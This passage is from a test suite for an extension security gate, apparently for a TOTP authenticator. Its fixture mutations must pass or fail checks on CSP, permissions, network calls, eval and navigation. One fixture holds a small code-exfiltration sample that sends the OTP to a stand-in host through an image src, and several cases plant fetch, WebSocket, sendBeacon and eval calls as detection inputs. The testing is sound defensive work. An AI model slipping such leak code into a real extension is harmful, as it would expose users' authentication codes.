      action: { default_popup: 'popup/popup.html' },
      content_security_policy: { extension_pages: APPROVED_CSP },
    },
    files: {
      'background.js': BACKGROUND_SOURCE,
      'lib/autofill-worker.js': WORKER_SOURCE,
      'lib/fieldfind.js': FIELDFIND_SOURCE,
      'content/autofill.js': CONTENT_SOURCE,
      'popup/settings.js':
        "import * as session from './session.js';\nexport async function removeBinding(origin) {\n  await session.removeBinding(origin);\n  return chrome.permissions.contains({ origins: [`${origin}/*`] });\n}\n",
      'popup/list.js': "export const hasAccess = (origin) => chrome.permissions.contains({ origins: [`${origin}/*`] });\n",
      'lib/base32.js': "export function decode(str) { return new Uint8Array(str.length); }\n",
      'lib/totp.js':
        "// RFC 6238 over WebCrypto\nexport async function hotp(key) {\n  return crypto.subtle.importKey('raw', key, { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']);\n}\n",
      'lib/store.js': "export async function load() { return chrome.storage.local.get('vault'); }\n",
      'lib/qr.js': "import jsQR from '../vendor/jsQR.js';\nexport function decode(img) { return jsQR(img.data, img.width, img.height); }\n",
      'lib/nav.js': NAV_WRAPPER_SOURCE,
      'lib/vault.js':
        "/**\n * - 'corrupt'  malformed record or key; open() with a key that does not authenticate\n * @returns {Promise<object>} new record\n */\nexport async function open(rawKey, record) {\n  return { rawKey, record };\n}\n",
      'popup/popup.html':
        '<!doctype html>\n<html>\n<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light dark"><link rel="stylesheet" href="popup.css"></head>\n<body data-state="setup">\n<a href="#top">Top</a> <a class="x" href="settings.html">Settings</a>\n<form id="setup-form" class="stack" novalidate>\n<input id="setup-pass" type="password">\n<button type="submit" id="setup-submit">Create</button>\n</form>\n<dialog><form method="dialog"><button>Close</button></form></dialog>\n<button id="lock-btn" type="button">Lock</button>\n<script type="module" src="popup.js"></script>\n</body>\n</html>\n',
      'popup/popup.css':
        'body { font: 13px system-ui; }\n.brand { background: url(../icons/16.png) no-repeat; }\n.check { background-image: url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E"); }\n@media (prefers-color-scheme: dark) { body { color: white; } }\n',
      'popup/popup.js': [
        "import * as vault from '../lib/vault.js';",
        "import { openOwnView } from '../lib/nav.js';",
        "document.getElementById('lock-btn').addEventListener('click', () => {});",
        'const add = { open(options) { return options; } };',
        'const settings = { open() {} };',
        "if (location.hash) history.replaceState(null, '', location.pathname);",
        "const here = location.href === 'x' || location.pathname == '/popup.html';",
        'add.open({ fileMode: true });',
        'settings.open();',
        'const opened = vault',
        '  .open(new Uint8Array(32), {});',
        'function open({ fileMode = false } = {}) { return fileMode; }',
        'export async function scan() {',
        '  const isTab = Boolean(await chrome.tabs.getCurrent());',
        '  const maybe = await chrome.tabs?.getCurrent();',
        "  const image = await chrome.tabs.captureVisibleTab(undefined, { format: 'png' });",
        "  await openOwnView('add-file');",
        "  await openOwnView('settings'); // a full tab",
        '  window.close();',
        '  return { isTab, image, here, opened, open };',
        '}',
        'export function download(blob, name) {',
        '  const url = URL.createObjectURL(blob);',
        "  const link = document.createElement('a');",
        '  link.href = url;',
        '  link.download = name;',
        '  link.click();',
        '}',
        '// The bind view: asks the browser for exactly one site.',
        'export function allowSite(origin) {',
        '  return chrome.permissions.request({ origins: [`${origin}/*`] });',
        '}',
        '',
      ].join('\n'),
      'vendor/jsQR.js': 'export default function jsQR() { return null; }\n',
      'vendor/jsQR.LICENSE': 'Apache License 2.0 (fixture)\n',
      'icons/16.png': ONE_PIXEL_PNG,
      'icons/128.png': ONE_PIXEL_PNG,
      '_locales/en/messages.json': JSON.stringify({ name: { message: 'zauthenticator' } }),
    },
    symlinks: {},
    sums: 'auto', // 'auto' = write correct sums for vendor/; a string = write it verbatim; null = no file
  };
}

function writeFixture(dir, fx) {
  fs.mkdirSync(dir, { recursive: true });
  if (fx.manifestRaw !== undefined) fs.writeFileSync(path.join(dir, 'manifest.json'), fx.manifestRaw);
  else fs.writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(fx.manifest, null, 2));
  for (const [rel, content] of Object.entries(fx.files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), content);
  }
  for (const [rel, target] of Object.entries(fx.symlinks)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.symlinkSync(target, path.join(dir, rel));
  }
  if (fx.sums === 'auto') {
    const lines = Object.keys(fx.files)
      .filter((rel) => rel.startsWith('vendor/'))
      .sort()
      .map((rel) => `${sha256(path.join(dir, rel))}  ${rel.slice('vendor/'.length)}`);
    fs.writeFileSync(path.join(dir, SUMS_PATH), `${lines.join('\n')}\n`);
  } else if (typeof fx.sums === 'string') {
    fs.writeFileSync(path.join(dir, SUMS_PATH), fx.sums);
  }
}

// A realistic value per forbidden key; presence alone must fail.
const SAMPLE_KEY_VALUES = {
  host_permissions: ['<all_urls>'],
  content_scripts: [{ matches: ['<all_urls>'], js: ['lib/x.js'] }],
  externally_connectable: { ids: ['*'] },
  update_url: 'x',
  key: 'x',
  web_accessible_resources: [{ resources: ['popup/*'], matches: ['<all_urls>'] }],
  sandbox: { pages: ['popup/popup.html'] },
  declarative_net_request: { rule_resources: [] },
  chrome_url_overrides: { newtab: 'popup/popup.html' },
  oauth2: { client_id: 'x', scopes: [] },
};

const setCsp = (policy) => (fx) => {
  fx.manifest.content_security_policy.extension_pages = policy;
};
const replaceDirective = (name, value) => setCsp(APPROVED_CSP.replace(new RegExp(`${name} [^;]*`), `${name} ${value}`));
const dropDirective = (name) => setCsp(APPROVED_CSP.replace(new RegExp(`(?:; )?${name} [^;]*`), '').replace(/^; /, ''));
const addJs = (rel, code) => (fx) => {
  fx.files[rel] = code;
};
// Adds code at the end of a fixture file (creating it when absent).
const appendJs = (rel, code) => (fx) => {
  fx.files[rel] = `${fx.files[rel] ?? ''}${code}`;
};
// Replaces text that occurs exactly once in the fixture worker.
const editWorker = (from, to) => (fx) => {
  fx.files['lib/autofill-worker.js'] = replacedOnce(fx.files['lib/autofill-worker.js'], from, to);
};
// Replaces the fixture worker's one executeScript call.
const editInjection = (to) => editWorker("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] });", to);
// A worker function that would leak the code if it were injected instead of fillFocused.
const appendGrab = appendJs('lib/autofill-worker.js', "function grab(code) { document.querySelector('img').src = '//x/?c=' + code; }\n");
const importInWorker = (what) => editWorker("import { openOwnWindow } from './nav.js';", `import { openOwnWindow } from './nav.js';\nimport { ${what} } from './bindings.js';`);
const REGISTRATION_OBJECT = "{ id: 'autofill', matches, js: CONTENT_SCRIPTS, allFrames: true, runAt: 'document_idle', persistAcrossSessions: true }";
const both = (...mutations) => (fx) => mutations.forEach((mutate) => mutate(fx));
const appendContent = (code) => appendJs('content/autofill.js', code);
const setBackground = (value) => (fx) => {
  fx.manifest.background = value;
};
const setOptionalHosts = (value) => (fx) => {
  fx.manifest.optional_host_permissions = value;
};
const addHtml = (markup) => (fx) => {
  fx.files['popup/popup.html'] = fx.files['popup/popup.html'].replace('</body>', `${markup}\n</body>`);
};
const addCss = (css) => (fx) => {
  fx.files['popup/popup.css'] += css;
};
// Rewrites the correct SHA256SUMS: (text, jsQR line hash) → new text.
const editSums = (edit) => (fx) => {
  fx.sumsEdit = edit;
};
const WRONG_HASH = '0'.repeat(64);

// A weaker value per approved directive; each must fail the csp rule only.
const WEAKER_DIRECTIVES = [
  ['default-src', "'self'"],
  ['script-src', "'self' https:"],
  ['style-src', "'self' 'unsafe-inline'"],
  ['img-src', "'self' data: blob: https:"],
  ['connect-src', "'self'"],
  ['object-src', "'self'"],
  ['base-uri', "'self'"],
  ['form-action', "'self'"],
  ['frame-ancestors', '*'],
];

// [name, mutate(fixture), expected failing rules]
const CASES = [
  ['clean', () => {}, []],
  ['ok-homepage-exact', (fx) => (fx.manifest.homepage_url = HOMEPAGE_URL), []],
  ['ok-vendor-exempt-from-scan', addJs('vendor/jsQR.js', "fetch('https://x.test/'); eval('1'); new WebSocket('wss://x'); window.open('https://x.test/');\n"), []],
  ['ok-word-boundaries', addJs('lib/words.js', '// prefetch(x) retrieval(y) refetch(z) reopen(x) geolocation = 1\nconst fetched = 1; const evaluate = () => 0; const opener = window.opener?.closed;\n'), []],
  ['ok-ds-store-ignored', (fx) => (fx.files['popup/.DS_Store'] = Buffer.from([0, 0, 0, 1, 66, 117, 100, 49])), []],
  ['ok-sums-binary-marker', editSums((text) => text.replace(/^([0-9a-f]{64}) {2}/gm, '$1 *')), []],
  [
    'ok-sums-comment-line',
    (fx) => {
      fx.sums = 'comment';
    },
    [],
  ],
  ['bad-manifest-json', (fx) => (fx.manifestRaw = '{ "manifest_version": 3, '), ['manifest', 'permissions', 'manifest-keys', 'background', 'homepage-url', 'csp']],
  ['bad-manifest-v2', (fx) => (fx.manifest.manifest_version = 2), ['manifest']],
  ['perm-tabs', (fx) => fx.manifest.permissions.push('tabs'), ['permissions']],
  ['perm-not-array', (fx) => (fx.manifest.permissions = 'storage'), ['permissions']],
  ['perm-optional-permissions', (fx) => (fx.manifest.optional_permissions = ['downloads']), ['permissions']],
  ['perm-optional-host-permissions', (fx) => (fx.manifest.optional_host_permissions = ['*://*/*']), ['permissions']],
  ['perm-optional-not-array', (fx) => (fx.manifest.optional_permissions = 'tabs'), ['permissions']],
  ['ok-optional-permissions-empty', (fx) => (fx.manifest.optional_permissions = []), []],
  // v0.2: the two auto-fill permissions are allowed, a subset (the v0.1 set) still passes.
  ['ok-permissions-v01-subset', (fx) => (fx.manifest.permissions = ['storage', 'activeTab']), []],
  ['perm-userscripts', (fx) => fx.manifest.permissions.push('userScripts'), ['permissions']],
  ['perm-webrequest', (fx) => fx.manifest.permissions.push('webRequest'), ['permissions']],
  ['perm-all-urls-as-permission', (fx) => fx.manifest.permissions.push('<all_urls>'), ['permissions']],
  // optional_host_permissions: exactly ["https://*/*"], nothing wider, narrower or repeated.
  ['perm-optional-host-all-urls', setOptionalHosts(['<all_urls>']), ['permissions'], /optional_host_permissions is/],
  ['perm-optional-host-http', setOptionalHosts(['http://*/*']), ['permissions'], /optional_host_permissions is/],
  ['perm-optional-host-extra', setOptionalHosts(['https://*/*', 'http://*/*']), ['permissions'], /optional_host_permissions is/],
  ['perm-optional-host-file', setOptionalHosts(['https://*/*', 'file:///*']), ['permissions'], /optional_host_permissions is/],
  ['perm-optional-host-repeated', setOptionalHosts(['https://*/*', 'https://*/*']), ['permissions'], /optional_host_permissions is/],
  ['perm-optional-host-one-site', setOptionalHosts(['https://example.com/*']), ['permissions'], /optional_host_permissions is/],
  ['perm-optional-host-uppercase', setOptionalHosts(['HTTPS://*/*']), ['permissions'], /optional_host_permissions is/],
  ['perm-optional-host-empty', setOptionalHosts([]), ['permissions'], /optional_host_permissions is \[\]/],
  ['perm-optional-host-string', setOptionalHosts('https://*/*'), ['permissions'], /not an array/],
  ['perm-optional-host-absent', (fx) => delete fx.manifest.optional_host_permissions, ['permissions'], /optional_host_permissions missing/],
  // background: exactly { service_worker: 'background.js', type: 'module' }.
  ['ok-background-key-order', setBackground({ type: 'module', service_worker: 'background.js' }), []],
  ['background-absent', (fx) => delete fx.manifest.background, ['background'], /missing/],
  ['background-extra-key', setBackground({ service_worker: 'background.js', type: 'module', persistent: false }), ['background']],
  ['background-scripts-too', setBackground({ service_worker: 'background.js', type: 'module', scripts: ['background.js'] }), ['background']],
  ['background-classic-worker', setBackground({ service_worker: 'background.js' }), ['background']],
  ['background-type-classic', setBackground({ service_worker: 'background.js', type: 'classic' }), ['background']],
  ['background-other-file', setBackground({ service_worker: 'lib/store.js', type: 'module' }), ['background']],
  // The e2e test copy's entry (e2e/fixtures/background.test.js) can never pass the gate.
  ['background-test-entry', setBackground({ service_worker: 'background.test.js', type: 'module' }), ['background']],
  ['background-mv2-page', setBackground({ page: 'popup/popup.html' }), ['background']],
  ['background-string', setBackground('background.js'), ['background']],
  ['background-array', setBackground([{ service_worker: 'background.js', type: 'module' }]), ['background']],
  ['background-null', setBackground(null), ['background']],
  ...MANIFEST_POLICY.forbiddenKeys.map((key) => [`key-${key}`, (fx) => (fx.manifest[key] = SAMPLE_KEY_VALUES[key] ?? []), ['manifest-keys']]),
  ['key-empty-host-permissions', (fx) => (fx.manifest.host_permissions = []), ['manifest-keys']],
  // What the e2e test copy adds so that no permission prompt appears: refused here.
  ['key-host-permissions-test-origins', (fx) => (fx.manifest.host_permissions = ['https://otp.test/*', 'https://evil.test/*']), ['manifest-keys']],
  ['key-content-scripts-autofill', (fx) => (fx.manifest.content_scripts = [{ matches: ['https://*/*'], js: ['content/autofill.js'], all_frames: true }]), ['manifest-keys']],
  ['homepage-other-host', (fx) => (fx.manifest.homepage_url = 'https://example.com/'), ['homepage-url']],
  ['homepage-trailing-slash', (fx) => (fx.manifest.homepage_url = `${HOMEPAGE_URL}/`), ['homepage-url']],
  ['homepage-http', (fx) => (fx.manifest.homepage_url = HOMEPAGE_URL.replace('https:', 'http:')), ['homepage-url']],

  // CSP: exactly the approved policy.
  [
    'ok-csp-reordered-and-recased',
    setCsp(
      "  FRAME-ANCESTORS 'none';connect-src  'NONE' ; img-src blob: 'self' DATA:; default-src 'none'; script-src 'self'; style-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none';  ",
    ),
    [],
  ],
  // ASCII whitespace (tab, LF, FF, CR, space) separates tokens and directives; anything else
  // does not, and a browser skips a directive that contains a non-ASCII character.
  [
    'ok-csp-ascii-whitespace',
    setCsp(
      "\tdefault-src\t'none';\nscript-src\r\n'self';\fstyle-src 'self';img-src\t'self'\fdata:\nblob:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'\r\n",
    ),
    [],
  ],
  ['csp-nbsp-separator', setCsp(APPROVED_CSP.replace("default-src 'none'", "default-src 'none'")), ['csp'], /U\+00A0/],
  ['csp-em-space-separator', setCsp(APPROVED_CSP.replace("; script-src 'self'", "; script-src 'self'")), ['csp'], /U\+2003/],
  ['csp-nbsp-around-policy', setCsp(` ${APPROVED_CSP} `), ['csp'], /U\+00A0/],
  ['csp-vertical-tab-separator', setCsp(APPROVED_CSP.replace("connect-src 'none'", "connect-src\u000b'none'")), ['csp'], /U\+000B/],
  ['csp-absent', (fx) => delete fx.manifest.content_security_policy, ['csp']],
  ['csp-mv2-string', (fx) => (fx.manifest.content_security_policy = APPROVED_CSP), ['csp']],
  ['csp-empty', setCsp(''), ['csp']],
  ...WEAKER_DIRECTIVES.map(([name, value]) => [`csp-weaker-${name}`, replaceDirective(name, value), ['csp']]),
  ...WEAKER_DIRECTIVES.map(([name]) => [`csp-without-${name}`, dropDirective(name), ['csp']]),
  ['csp-extra-frame-src', setCsp(`${APPROVED_CSP}; frame-src https:`), ['csp']],
  ['csp-extra-worker-src', setCsp(`${APPROVED_CSP}; worker-src 'self'`), ['csp']],
  ['csp-extra-report-uri', setCsp(`${APPROVED_CSP}; report-uri /csp`), ['csp']],
  ['csp-extra-upgrade-insecure', setCsp(`${APPROVED_CSP}; upgrade-insecure-requests`), ['csp']],
  ['csp-duplicate-directive', setCsp(`${APPROVED_CSP}; script-src *`), ['csp']],
  ['csp-duplicate-directive-first', setCsp(`img-src *; ${APPROVED_CSP}`), ['csp']],
  ['csp-duplicate-source', setCsp(APPROVED_CSP.replace("img-src 'self' data: blob:", "img-src 'self' data: blob: blob:")), ['csp']],
  ['csp-comma-second-policy', setCsp(`${APPROVED_CSP}, img-src *`), ['csp']],
  ['csp-unsafe-eval', setCsp(APPROVED_CSP.replace("script-src 'self'", "script-src 'self' 'unsafe-eval'")), ['csp']],
  ['csp-unsafe-inline', setCsp(APPROVED_CSP.replace("style-src 'self'", "style-src 'self' 'unsafe-inline'")), ['csp']],
  ['csp-wasm-unsafe-eval', setCsp(APPROVED_CSP.replace("script-src 'self'", "script-src 'self' 'wasm-unsafe-eval'")), ['csp']],
  [
    'csp-sandbox-key',
    (fx) => (fx.manifest.content_security_policy.sandbox = "sandbox allow-scripts; script-src 'self' 'unsafe-eval'"),
    ['csp'],
  ],

  ['type-wasm', (fx) => (fx.files['lib/qr.wasm'] = Buffer.from([0x00, 0x61, 0x73, 0x6d])), ['file-types']],
  ['type-svg', (fx) => (fx.files['icons/logo.svg'] = '<svg xmlns="x"></svg>'), ['file-types']],
  ['type-no-extension-binary', (fx) => (fx.files['lib/helper'] = Buffer.from([0x7f, 0x45, 0x4c, 0x46])), ['file-types']],
  ['type-fake-png', (fx) => (fx.files['icons/48.png'] = Buffer.from([0x00, 0x61, 0x73, 0x6d, 1, 0, 0, 0])), ['file-types']],
  ['type-symlink', (fx) => (fx.symlinks['lib/link.js'] = 'totp.js'), ['file-types']],
  ['net-fetch', addJs('lib/x.js', "export const f = () => fetch('/x');\n"), ['network-api']],
  ['net-fetch-in-comment', addJs('lib/x.js', '// never call fetch(dataUrl) here\n'), ['network-api']],
  ['net-xhr', addJs('lib/x.js', 'export const x = new XMLHttpRequest();\n'), ['network-api']],
  ['net-websocket', addJs('lib/x.js', "export const w = new WebSocket('/');\n"), ['network-api']],
  ['net-eventsource', addJs('lib/x.js', "export const e = new EventSource('/');\n"), ['network-api']],
  ['net-sendbeacon', addJs('lib/x.js', "navigator.sendBeacon('/', '');\n"), ['network-api']],
  ['net-fetch-in-html', addHtml('<!-- fetch(x) -->'), ['network-api']],
  ['dyn-eval', addJs('lib/x.js', "export const v = eval('1 + 1');\n"), ['dynamic-code']],
  ['dyn-new-function', addJs('lib/x.js', "export const v = new Function('return 1');\n"), ['dynamic-code']],
  ['dyn-importscripts', addJs('lib/x.js', "importScripts('a.js');\n"), ['dynamic-code']],
  ['dyn-javascript-url-js', addJs('lib/x.js', "link.href = 'javascript:void 0';\n"), ['dynamic-code']],
  // A javascript: href is dynamic code and also a link that leaves the extension's pages.
  ['dyn-javascript-url-html', addHtml('<a href="JavaScript:void 0">x</a>'), ['dynamic-code', 'navigation']],
  ['dyn-string-settimeout', addJs('lib/x.js', "setTimeout('tick()', 10);\n"), ['dynamic-code']],
  ['dyn-template-setinterval', addJs('lib/x.js', 'window.setInterval(\n  `tick()`, 1000);\n'), ['dynamic-code']],
  [
    'ok-function-timers-and-mime',
    addJs('lib/timers.js', "// served as text/javascript\nconst t = setTimeout(() => tick(), 10);\nsetInterval(tick, 1000);\nclearTimeout(t);\nfunction tick() {}\n"),
    [],
  ],
  ['net-rtcpeerconnection', addJs('lib/x.js', 'export const pc = new RTCPeerConnection();\n'), ['network-api']],
  ['net-webkitrtcpeerconnection', addJs('lib/x.js', 'export const pc = new webkitRTCPeerConnection({});\n'), ['network-api']],
  ['url-https-js', addJs('lib/x.js', "export const u = 'https://example.com/';\n"), ['remote-url']],
  ['url-http-html', addHtml('<img src="http://example.com/a.png">'), ['remote-url']],

  // CSS: nothing loaded from elsewhere.
  ['css-url-https', addCss('.a { background: url(https://example.com/a.png); }\n'), ['css-remote']],
  ['css-url-http-quoted', addCss('.a { background: URL( "HTTP://example.com/a.png" ); }\n'), ['css-remote']],
  ['css-url-protocol-relative', addCss(".a { background: url('//example.com/a.png'); }\n"), ['css-remote']],
  ['css-url-backslashes', addCss('.a { background: url(\\\\example.com/a.png); }\n'), ['css-remote']],
  ['css-import-string', addCss('@import "theme.css";\n'), ['css-remote']],
  ['css-import-url', addCss('@IMPORT url(theme.css) screen;\n'), ['css-remote']],
  ['css-image-set-https', addCss('.a { background-image: image-set("https://example.com/a.png" 1x); }\n'), ['css-remote']],
  ['css-in-nested-dir', (fx) => (fx.files['popup/themes/dark.css'] = '@import "../popup.css";\n'), ['css-remote']],
  ['ok-css-vendor-exempt', (fx) => (fx.files['vendor/x.css'] = '@import "https://example.com/x.css";\n'), []],

  // Navigation sinks.
  ['nav-window-open', addJs('lib/x.js', "window.open('popup.html');\n"), ['navigation']],
  ['nav-window-open-optional', addJs('lib/x.js', "window?.open('popup.html');\n"), ['navigation']],
  ['nav-globalthis-open', addJs('lib/x.js', "globalThis.open('popup.html');\n"), ['navigation']],
  ['nav-self-open-bracket', addJs('lib/x.js', "self['open']('popup.html');\n"), ['navigation']],
  ['nav-bare-open', addJs('lib/x.js', 'export const go = (u) => open(u);\n'), ['navigation']],
  ['nav-bare-open-return', addJs('lib/x.js', "export function go() {\n  return open('popup.html', '_blank');\n}\n"), ['navigation']],
  ['nav-location', addJs('lib/x.js', "location = 'popup.html';\n"), ['navigation']],
  ['nav-location-href', addJs('lib/x.js', 'export const go = (u) => { location.href = u; };\n'), ['navigation']],
  ['nav-document-location', addJs('lib/x.js', 'export const go = (u) => { document.location = u; };\n'), ['navigation']],
  ['nav-window-location', addJs('lib/x.js', 'export const go = (u) => { window.location = u; };\n'), ['navigation']],
  ['nav-window-location-href', addJs('lib/x.js', 'export const go = (u) => { window.location.href=u; };\n'), ['navigation']],
  ['nav-location-host', addJs('lib/x.js', 'export const go = (h) => { location.host = h; };\n'), ['navigation']],
  ['nav-location-assign', addJs('lib/x.js', 'export const go = (u) => location.assign(u);\n'), ['navigation']],
  ['nav-location-replace', addJs('lib/x.js', 'export const go = (u) => window.location.replace(u);\n'), ['navigation']],
  ['nav-a-target', addHtml('<a href="popup.html" target="_blank">x</a>'), ['navigation']],
  ['nav-a-href-scheme', addHtml('<a href="chrome://settings/">x</a>'), ['navigation']],
  ['nav-a-href-mailto', addHtml("<a href='mailto:a@example.com'>x</a>"), ['navigation']],
  ['nav-a-href-protocol-relative', addHtml('<a href=//example.com/>x</a>'), ['navigation']],
  ['nav-a-href-https', addHtml('<a href="https://example.com/">x</a>'), ['navigation', 'remote-url']],
  ['nav-a-href-char-reference', addHtml('<a href="&#104;ttps:&#47;&#47;example.com/">x</a>'), ['navigation']],
  ['nav-area-href', addHtml('<map name="m"><area shape="rect" coords="0,0,1,1" href="//example.com/"></map>'), ['navigation']],
  ['nav-a-in-js-string', addJs('lib/x.js', "export const html = '<a href=\"//example.com/\">x</a>';\n"), ['navigation']],
  ['nav-form-action', addHtml('<form action="popup.html"><button>x</button></form>'), ['navigation']],
  ['nav-form-target', addHtml('<form target="_blank"><button>x</button></form>'), ['navigation']],
  ['nav-formaction', (fx) => (fx.files['popup/popup.html'] = fx.files['popup/popup.html'].replace('id="setup-submit"', 'id="setup-submit" formaction="popup.html"')), ['navigation']],
  ['nav-formtarget', (fx) => (fx.files['popup/popup.html'] = fx.files['popup/popup.html'].replace('id="setup-submit"', 'id="setup-submit" formtarget="_blank"')), ['navigation']],
  ['nav-meta-refresh', addHtml('<meta http-equiv="Refresh" content="0; url=popup.html">'), ['navigation']],
  ['nav-meta-refresh-unquoted', (fx) => (fx.files['popup/popup.html'] = fx.files['popup/popup.html'].replace('<meta charset="utf-8">', '<meta charset="utf-8"><meta http-equiv=refresh content=0>')), ['navigation']],
  ['nav-iframe', addHtml('<iframe src="settings.html"></iframe>'), ['navigation']],
  ['nav-frame', addHtml('<frameset><frame src="settings.html"></frameset>'), ['navigation']],
  ['nav-embed', addHtml('<embed src="settings.html">'), ['navigation']],
  ['nav-object', addHtml('<object data="settings.html"></object>'), ['navigation']],
  ['nav-iframe-in-js-string', addJs('lib/x.js', "document.body.insertAdjacentHTML('beforeend', '<iframe src=\"settings.html\"></iframe>');\n"), ['navigation']],
  ['nav-tabs-create-homepage', addJs('lib/x.js', 'chrome.tabs.create({ url: chrome.runtime.getManifest().homepage_url });\n'), ['navigation']],
  ['nav-tabs-create-variable', addJs('lib/x.js', 'export const go = (u) => chrome.tabs.create({ url: u });\n'), ['navigation']],
  ['nav-tabs-create-relative', addJs('lib/x.js', "chrome.tabs.create({ url: 'popup/popup.html' });\n"), ['navigation']],
  ['nav-tabs-create-getURL-not-first', addJs('lib/x.js', "chrome.tabs.create({ url: x || chrome.runtime.getURL('popup/popup.html') });\n"), ['navigation']],
  ['nav-tabs-create-second-url', addJs('lib/x.js', "chrome.tabs.create({ url: chrome.runtime.getURL('a.html'), url: target });\n"), ['navigation']],
  ['nav-tabs-create-quoted-key', addJs('lib/x.js', "chrome.tabs.create({ 'url': target });\n"), ['navigation']],
  ['nav-tabs-create-options-variable', addJs('lib/x.js', 'export const go = (opts) => chrome.tabs.create(opts);\n'), ['navigation']],
  ['nav-tabs-create-spread', addJs('lib/x.js', "export const go = (o) => chrome.tabs.create({ url: chrome.runtime.getURL('a.html'), ...o });\n"), ['navigation']],
  ['nav-tabs-create-shorthand', addJs('lib/x.js', 'export const go = (url) => chrome.tabs.create({ url });\n'), ['navigation']],
  ['nav-tabs-create-no-url', addJs('lib/x.js', 'chrome.tabs.create({ active: true });\n'), ['navigation']],
  ['nav-tabs-create-optional-chain', addJs('lib/x.js', 'chrome.tabs?.create({ url: u });\n'), ['navigation']],
  ['nav-tabs-update-url', addJs('lib/x.js', 'export const go = (tab, u) => chrome.tabs.update(tab.id, { url: u });\n'), ['navigation']],
  ['nav-windows-create', addJs('lib/x.js', "export const go = (u) => chrome.windows.create({ url: u, type: 'popup' });\n"), ['navigation']],
  ['nav-windows-create-url-list', addJs('lib/x.js', "chrome.windows.create({ url: [chrome.runtime.getURL('a.html'), u] });\n"), ['navigation']],
  ['nav-tabs-alias', addJs('lib/x.js', 'const tabs = chrome.tabs;\ntabs.create({ url: u });\n'), ['navigation']],
  ['nav-tabs-destructure', addJs('lib/x.js', 'const { create } = chrome.tabs;\n'), ['navigation']],
  ['nav-tabs-computed', addJs('lib/x.js', "chrome.tabs['create']({ url: u });\n"), ['navigation']],
  ['nav-tabs-goback', addJs('lib/x.js', 'chrome.tabs.goBack();\n'), ['navigation']],
  ['nav-tabs-duplicate', addJs('lib/x.js', 'chrome.tabs.duplicate(tab.id);\n'), ['navigation']],
  // Outside lib/nav.js nothing opens or changes a tab, whatever the arguments look like.
  ['nav-tabs-create-getURL-elsewhere', addJs('lib/x.js', "chrome.tabs.create({ url: chrome.runtime.getURL('popup/popup.html#add-file') });\n"), ['navigation']],
  [
    'nav-tabs-create-getURL-multiline',
    addJs('lib/x.js', "await chrome.tabs.create({\n  url: chrome.runtime.getURL('popup/popup.html#settings'),\n  active: true,\n});\n"),
    ['navigation'],
  ],
  ['nav-tabs-create-getURL-concat', addJs('lib/x.js', "chrome.tabs.create({ url: chrome.runtime.getURL('x') + y });\n"), ['navigation']],
  ['nav-tabs-create-getURL-or', addJs('lib/x.js', 'chrome.tabs.create({ url: chrome.runtime.getURL(a) || other });\n'), ['navigation']],
  ['nav-tabs-update-built-options', addJs('lib/x.js', 'chrome.tabs.update(id, Object.assign({}, opts));\n'), ['navigation']],
  ['nav-tabs-update-active', addJs('lib/x.js', 'chrome.tabs.update(id, { active: true });\n'), ['navigation']],
  ['nav-tabs-update-getURL', addJs('lib/x.js', "chrome.tabs.update(id, { url: chrome.runtime.getURL('popup/popup.html') });\n"), ['navigation']],
  ['nav-tabs-reload', addJs('lib/x.js', 'chrome.tabs.reload(id);\n'), ['navigation']],
  ['nav-tabs-goforward', addJs('lib/x.js', 'chrome.tabs.goForward(id);\n'), ['navigation']],
  ['nav-windows-update', addJs('lib/x.js', 'chrome.windows.update(id, { focused: true });\n'), ['navigation']],
  ['nav-tabs-method-reference', addJs('lib/x.js', 'const make = chrome.tabs.create;\nmake({ url: u });\n'), ['navigation']],
  ['nav-tabs-optional-chrome', addJs('lib/x.js', 'export const go = (u) => chrome?.tabs.create({ url: u });\n'), ['navigation']],
  ['nav-chrome-destructure', addJs('lib/x.js', 'const { tabs } = chrome;\ntabs.create({ url: u });\n'), ['navigation']],
  ['nav-chrome-computed', addJs('lib/x.js', "chrome['tabs'].create({ url: u });\n"), ['navigation']],
  ['nav-chrome-alias', addJs('lib/x.js', 'const c = chrome;\nc.tabs.create({ url: u });\n'), ['navigation']],
  ['nav-tabs-spaced-comment', addJs('lib/x.js', 'chrome.tabs /* x */ .create({ url: u });\n'), ['navigation']],
  // The exemption is the path lib/nav.js, not the content.
  ['nav-wrapper-copy-elsewhere', (fx) => (fx.files['popup/nav.js'] = NAV_WRAPPER_SOURCE), ['navigation']],
  // lib/nav.js itself is pinned by sha256.
  ['nav-wrapper-missing', (fx) => delete fx.files['lib/nav.js'], ['nav-wrapper'], /missing/],
  ['nav-wrapper-one-byte', (fx) => (fx.files['lib/nav.js'] = NAV_WRAPPER_SOURCE.replace("'settings'", "'settingz'")), ['nav-wrapper'], /sha256/],
  ['nav-wrapper-trailing-byte', (fx) => (fx.files['lib/nav.js'] = `${NAV_WRAPPER_SOURCE}\n`), ['nav-wrapper'], /sha256/],
  [
    'nav-wrapper-any-url',
    (fx) => (fx.files['lib/nav.js'] = replacedOnce(replacedOnce(NAV_WRAPPER_SOURCE, 'if (!TAB_VIEWS.has(view)) throw', 'if (!view) throw'), '{ url: chrome.runtime.getURL(`popup/popup.html#${view}`) }', '{ url: view }')),
    ['nav-wrapper'],
    /sha256/,
  ],
  [
    'nav-wrapper-window-any-url',
    (fx) => (fx.files['lib/nav.js'] = replacedOnce(replacedOnce(NAV_WRAPPER_SOURCE, 'if (!WINDOW_VIEWS.has(view)) throw', 'if (!view) throw'), '    url: chrome.runtime.getURL(`popup/popup.html#${view}`),', '    url: view,')),
    ['nav-wrapper'],
    /sha256/,
  ],
  ['nav-wrapper-window-view-added', (fx) => (fx.files['lib/nav.js'] = replacedOnce(NAV_WRAPPER_SOURCE, "['bind', 'unlock']", "['bind', 'unlock', 'add-file']")), ['nav-wrapper'], /sha256/],
  // Windows and tabs from the new files go through lib/nav.js as well.
  ['nav-windows-create-in-worker', appendJs('lib/autofill-worker.js', "chrome.windows.create({ url: chrome.runtime.getURL('popup/popup.html#bind'), type: 'popup' });\n"), ['navigation']],
